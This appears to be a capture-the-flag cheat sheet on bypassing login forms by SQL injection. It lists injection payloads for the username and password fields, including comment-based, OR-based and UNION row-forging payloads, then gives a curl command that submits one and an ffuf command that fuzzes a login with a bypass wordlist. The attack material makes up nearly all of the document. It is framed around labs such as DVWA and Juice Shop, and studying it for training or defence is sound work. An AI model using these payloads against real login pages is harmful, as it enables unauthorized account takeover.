# Login bypass

Query: `SELECT ... FROM users WHERE username='<u>' AND password='<p>'`.
Hint: "one wrong line and it swings wide".

## Payloads (username field, any password)
```
admin' --             (note trailing space)   → logs in as admin
admin'#                (MySQL)
admin'/*
' OR 1=1 --            → first row (often admin)
' OR '1'='1' --
' OR 1=1 LIMIT 1 --
admin' OR '1'='1
') OR ('1'='1          (parenthesised queries)
" OR ""="              (double-quoted)
' UNION SELECT 1,'admin','admin','x' --     (forge a row; match column count)
```
Password field: `' OR '1'='1`. If the password is hashed in SQL (`password=MD5('<p>')`) inject
in the username only.

```bash
curl -s -c j -d "username=admin' -- &password=x" $T/login -L | grep -o 'flag{[^}]*}'
ffuf -u $T/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=FUZZ&password=x' -w wordlists/sqli/auth-bypass.txt -fr 'Invalid'
```

## After bypass
The flag is usually on the logged-in page for the *specific* user (e.g. admin's announcement).
If `' OR 1=1` logs you in as the wrong user, target by name (`admin' --`) or `LIMIT 1 OFFSET n`.

Seen in: `sqli1` (Staff Portal, SQLite: `admin' -- ` → admin row's `notice` shows the flag),
DVWA/bWAPP/Mutillidae login labs, Juice Shop "Login Admin" (`' OR 1=1--` in email).
